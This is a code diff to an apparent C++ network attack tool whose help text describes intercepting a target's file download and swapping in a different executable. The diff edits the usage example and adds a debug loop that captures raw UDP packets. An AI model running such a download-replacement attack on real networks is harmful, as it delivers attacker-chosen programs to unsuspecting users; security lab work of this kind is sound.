@@ -18,7 +18,7 @@ void PrintHelp(char** argv)
         << "<target ip>: target whose file you wish to intercept\n"
         << "<download link>: file you wish to replace\n"
         << "<new download link>: the path to the file you want the target to download\n\n"
-        << "Example: " << argv[0] << " eth0 "<< "4" << "10.0.2.4" << "download.example.co/testfile.exe" << std::endl;
+        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " download.example.co/testfile.exe" << "10.0.2.15/test_program.exe" << std::endl;
 }
 
 // TODO: improve args processing
@@ -54,16 +54,6 @@ int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion,
 
 int main(int argc, char** argv)
 {
-    /*
-    const char* str1 = "download.test.com";
-    const char* str2 = "/testfile.exe";
-    char str3[255]{};
-    PacketCraft::ConcatStr(str3, sizeof(str3), str1, str2);
-    std::cout << str3 << std::endl;
-    return 0;
-    */
-
-
     char interfaceName[IFNAMSIZ]{};
     uint32_t ipVersion{};
     char targetIP[INET6_ADDRSTRLEN]{};
@@ -78,6 +68,23 @@ int main(int argc, char** argv)
     } 
 
     int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+
+    //
+    while(true)
+    {
+        PacketCraft::Packet testPacket;
+        testPacket.Receive(socketFd, 0);
+        if(testPacket.FindLayerByType(PC_UDP) != nullptr)
+        {
+            testPacket.Print();
+            testPacket.CalculateChecksums();
+            testPacket.Print();
+            close(socketFd);
+            return 0;
+        }
+    }
+    //
+
 
     CHaks::FileInterceptor fileInterceptor;
     if(fileInterceptor.Run(socketFd, interfaceName, ipVersion, targetIP, downloadLink, newDownloadLink) == APPLICATION_ERROR)
